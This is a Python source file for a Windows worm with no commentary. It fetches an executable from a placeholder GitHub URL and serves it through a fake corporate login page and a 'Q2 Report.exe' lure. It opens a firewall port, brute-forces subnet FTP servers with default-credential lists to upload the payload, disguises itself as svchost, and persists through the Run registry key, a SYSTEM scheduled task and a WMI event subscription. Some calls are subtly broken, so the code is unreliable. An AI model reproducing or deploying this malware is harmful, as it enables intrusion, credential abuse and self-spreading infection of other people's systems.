import os
import winreg
import random
import string
import psutil
import subprocess
import socket
import threading
import sys
import requests
import urllib3
import ftplib
from http.server import HTTPServer, BaseHTTPRequestHandler
import wmi
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

GITHUB_URL = "https://raw.githubusercontent.com/<user>/<repo>/main/init.exe"

def generate_random_name(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def download_payload():
    try:
        random_name = f'{generate_random_name()}.exe'
        destination_path = os.path.join(os.environ('TEMP'), random_name)
        response = requests.get(GITHUB_URL)
        if response.status_code == 200:
            with open(destination_path, 'wb') as f:
                f.write(response.content)
        return destination_path
    except:
        return None

# HTTP server to serve init.exe and fake login page
class HTTPHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        random_name = generate_random_name()
        if self.path == f'/{random_name}.exe':
            self.send_response(200)
            self.send_header('Content-type', 'application/octet-stream')
            self.end_headers()
            payload_path = download_payload()
            if os.path.exists(payload_path):
                with open(payload_path, 'rb') as f:
                    self.wfile.write(f.read())
            else:
                self.send_response(404)
                self.end_headers()
        elif self.path == '/login':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            html = f"""
            <html>
                <head>
                    <style>
                        body {{ font-family: Arial; text-align: center; }}
                        .login {{ width: 300px; margin: 50px auto; padding: 20px; border: 1px solid #ccc; }}
                        input {{ margin: 10px; padding: 5px; width: 200px; }}
                        button {{ padding: 10px 20px; }}
                    </style>
                </head>
                <body>
                    <div class="login">
                        <h1>Corporate File Access</h1>
                        <form>
                            <input type="text" placeholder="Username"><br>
                            <input type="password" placeholder="Password"><br>
                            <button type="submit">Login</button>
                        </form>
                        <p>Download update: <a href="/{random_name}.exe">Install Update</a></p>
                    </div>
                </body>
            </html>
            """
            self.wfile.write(html.encode('utf-8'))
        elif self.path == '/files':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            html = f"""
            <html>
                <head>
                    <style>
                        body {{ font-family: Arial; text-align: center; }}
                        .files {{ margin: 50px auto; }}
                    </style>
                </head>
                <body>
                    <div class="files">
                        <h1>Shared Documents</h1>
                        <p>Download: <a href="/{random_name}.exe">Q2 Report.exe</a></p>
                    </div>
                </body>
            </html>
            """
            self.wfile.write(html.encode('utf-8'))

# Start HTTP server
def start_http_server():
    try:
        # Add firewall rule for port 80
        subprocess.run(
            'netsh advfirewall firewall add rule name="Allow HTTP" dir=in action=allow protocol=TCP localport=80',
            shell=True, capture_output=True, text=True
        )
        server = HTTPServer(('0.0.0.0', 80), HTTPHandler)
        threading.Thread(target=server.serve_forever, daemon=True).start()
    except:
        pass

# FTP propagation to subnet servers
def ftp_spread():
    try:
        local_ip = socket.gethostbyname(socket.gethostname()).rsplit('.', 1)[0]
        common_users = [
            'test',
            'abc123',
            'nic2212',
            'PlcmSpIp',
            'accounting',
            '123456',
            'nmt',
            'se',
            'supervisor',
            'Root',
            'MayGion',
            'USER',
            'admin',
            'manager',
            'mysql',
            'password',
            'user',
            'uploader',
            'support',
            'beijer',
            'fdrusers',
            'qwerty',
            'john',
            'nobody',
            'administrator',
            'default',
            'instrument',
            'device',
            'httpadmin',
            'none',
            'ftpuser',
            'pr',
            'anonymous',
            'post',
            'Guest',
            'marketing',
            'mail',
            'hr',
            'User',
            'IEIeMerge',
            'sysdiag',
            'webserver',
            'localadmin',
            'ftp',
            'QNUDECPU',
            'qbf77101',
            'webmaster',
            'apc',
            'ADMIN',
            'dmftp',
            'sa',
            'Admin',
            'postmaster',
            'dm',
            'oracle',
            '111111',
            'adtec',
            'a',
            'root',
            'user1',
            'loader',
            'su',
            'MELSEC',
            'ntpupdate',
            'ftp_boot',
            'pcfactory',
            'sales',
            'www-data',
            'wsupgrade',
            'avery',
        ]
        common_pass = [
            'USER',
            'admin',
            'Janitza',
            'eqidemo',
            'spam',
            'anonymous',
            'supervisor',
            'factorycast@schneider',
            'user00',
            'password',
            '12hrs37',
            '123456',
            'beijer',
            'maygion.com',
            'webadmin',
            'b1uRR3',
            'test2',
            'webmaster',
            'eMerge',
            'pass1',
            'test',
            'test123',
            'nobody',
            'test1',
            'root',
            'news',
            'info',
            'ftp',
            'ntpupdate',
            'webpages',
            'sresurdf',
            'uploader',
            'pcfactory',
            'ZYPCOM',
            'apc',
            'admin12345',
            'mysql',
            'system',
            'none',
            '1111',
            'ftp_boot',
            'MELSEC',
            'guest',
            'nas',
            'hexakisoctahedron',
            'techsupport',
            'localadmin',
            'default',
            'wsupgrade',
            'stingray',
            'dpstelecom',
            'fwdownload',
            'abc123',
            'web',
            'testingpw',
            'ko2003wa',
            'oracle',
            'cvsadm',
            '1234',
            'testing',
            'test4',
            'wago',
            'test3',
            'tester',
            '12345',
            'avery',
            'instrument',
            'user',
            'testuser',
            'fhttpadmin',
            'QNUDECPU',
            '9999',
            'rootpasswd',
            'PlcmSpIp',
            'poiuypoiuy',
            'sysadm'
        ]

        for i in range(1, 255):
            ip = f'{local_ip}.{i}'
            for user in common_users:
                for pwd in common_pass:
                    try:
                        ftp = ftplib.FTP(ip, timeout=1)
                        ftp.login(user, pwd)
                        random_name = f'{generate_random_name()}.exe'
                        payload_path = download_payload()
                        if payload_path:
                            with open(payload_path, 'rb') as f:
                                ftp.storbinary(f'STOR {random_name}', f)
                        ftp.quit()
                        break 
                    except:
                        continue
    except:
        pass

# Hide process by mimicking svchost
def hide_process():
    for proc in psutil.process_iter(['name']):
        if proc.info['name'].lower() == 'svchost.exe':
            os.environ['COMSPEC'] = proc.exe()
            break

# Persistence via Registry
def persist_registry():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        winreg.SetValueEx(key, generate_random_name(), 0, winreg.REG_SZ, f'"{exe_path}"')
        winreg.CloseKey(key)
    except:
        pass

# Persistence via schtasks
def persist_schtasks():
    task_name = generate_random_name()
    exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
    cmd = f'schtasks /create /tn "{task_name}" /tr "\"{exe_path}\"" /sc daily /st 00:00 /ru SYSTEM'
    subprocess.run(cmd, shell=True, capture_output=True, text=True)

# Persistence via process creation trigger
def persist_process_trigger():
    try:
        connection = wmi.WMI()
        event_filter = connection.__EventFilter(
            Name=generate_random_name(),
            Query="SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'explorer.exe'"
        )
        consumer = connection.Win32_CommandLineEventConsumer(
            Name=generate_random_name(),
            CommandLineTemplate=f'"{sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)}"'
        )
        connection.__FilterToConsumerBinding(
            Filter=f"__EventFilter.Name='{event_filter.Name}'",
            Consumer=f"Win32_CommandLineEventConsumer.Name='{consumer.Name}'"
        )
    except:
        pass

# Main execution
if __name__ == '__main__':
    import sys
    destination_path = download_payload()
    start_http_server()
    ftp_spread()
    hide_process()
    persist_registry()
    persist_schtasks()
    persist_process_trigger()